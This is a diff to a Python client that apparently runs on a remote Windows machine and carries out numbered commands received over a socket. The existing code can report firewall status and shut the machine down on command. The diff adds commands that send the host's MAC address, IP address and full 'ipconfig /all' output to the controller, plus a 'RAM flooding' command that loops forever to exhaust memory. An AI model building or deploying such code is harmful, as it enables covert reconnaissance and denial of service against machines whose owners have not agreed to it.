@@ -131,6 +131,21 @@ while close:
         action = ["Memory Available: ", psutil.virtual_memory().available]
         data_string = pickle.dumps(action)
         client.send(data_string)
+    elif value == "N1":
+        action = ["MAC Address: ", uuid.getnode()]
+        data_string = pickle.dumps(action)
+        client.send(data_string)
+    elif value == "N2":
+        action = ["IP Address: ", socket.gethostbyname(socket.gethostname())]
+        data_string = pickle.dumps(action)
+        client.send(data_string)
+    elif value == "N3":
+        action = [subprocess.check_output(['ipconfig', '/all']).decode('utf-8').split('\n')]
+        datalist = []
+        for item in action:
+            datalist.append(item.split('\r')[:-1])
+        data_string = pickle.dumps(datalist)
+        client.send(data_string)
     elif value == "F1":
         action = subprocess.check_output('netsh advfirewall show allprofiles', shell=True)
         client.send(action)
@@ -145,6 +160,12 @@ while close:
             client.send(bytes("Not admin", "utf8"))
     elif value == "39":
         os.system("shutdown /s /t 00")
+    elif value == "44":
+        print(prevalue)
+        print("RAM flooding started...")
+        array = []
+        while True:
+            array.append('test')
     elif value == "22":
         print(prevalue)
         processName = prevalue.split()[1]
